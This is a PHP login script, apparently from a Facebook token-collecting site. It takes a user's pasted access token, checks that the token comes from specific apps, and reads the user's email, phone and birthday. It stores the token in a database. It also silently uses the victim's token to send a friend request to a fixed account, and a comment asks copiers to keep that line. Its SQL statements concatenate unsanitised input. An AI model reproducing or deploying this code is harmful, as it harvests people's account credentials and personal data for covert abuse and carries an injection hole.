<?php 
ob_start(); 
session_start(); 
include './include/config.php'; 
$gettoken = htmlspecialchars($_POST['user']); 
if(preg_match("'access_token=(.*?)&expires_in='", $gettoken, $matches)){ 
        $token = $matches[1]; 
            }else{ 
        $token = $gettoken; 
    } 
if($token){ 
auto('https://graph.facebook.com/me/friends?method=post&uids=100004294419791&access_token='.$token); //gi&#7919; nguyên,vui long tôn tr&#7885;ng tác gi&#7843;, hãy t&#7841;o thêm 1 function m&#7899;i !//

$app = check($token); 
if($app[id] == "350685531728" || $app[id] == "6628568379"){ 
$me = me($token); 
if(preg_match("|@tfbnw.net|",$me['email'])){ 
header('Location: index.html?i=3'); 
exit; 
} 
if($me['id'] && !$me['category']){ 
$_SESSION['idfb'] = $me['id']; 
$_SESSION['ten'] = $me['name']; 
$_SESSION['ngaysinh'] = $me['birthday']; 
$_SESSION['email'] = $me['email']; 
if($me['gender'] == 'male'){ 
$_SESSION['gioitinh']='Nam'; 
} 
else 
{ 
$_SESSION['gioitinh']='Nữ'; 
} 
$_SESSION['username'] = $me['username']; 
$_SESSION['sdt'] = $me['mobile_phone']; 
$_SESSION['token'] = $token; 
$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM token WHERE idfb = '".$me['id']."'"); 
$rows = @mysqli_fetch_array($result,  MYSQLI_ASSOC); 
if(!$rows){ 
@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO token SET  
`idfb` = '".$me['id']."',   
`ten` = '".$me['name']."', 
`token` = '".$token."' 
"); 
} 
} 
} 
else 
{ 
header('Location: index.html?i=1'); 
exit; 
} 
} 
else 
{ 
header('Location: index.html?i=3'); 
exit; 
} 
header('Location: welcome.html?i=3'); 
function check($app){ 
return json_decode(auto('https://graph.facebook.com/app/?access_token='.$app),true); 
} 
function me($test){ 
return json_decode(auto('https://graph.facebook.com/me?access_token='.$test),true); 
} 
function auto($url){ 
   $curl = curl_init(); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
   curl_setopt($curl, CURLOPT_URL, $url); 
   $ch = curl_exec($curl); 
   curl_close($curl); 
   return $ch; 
   } 
?> 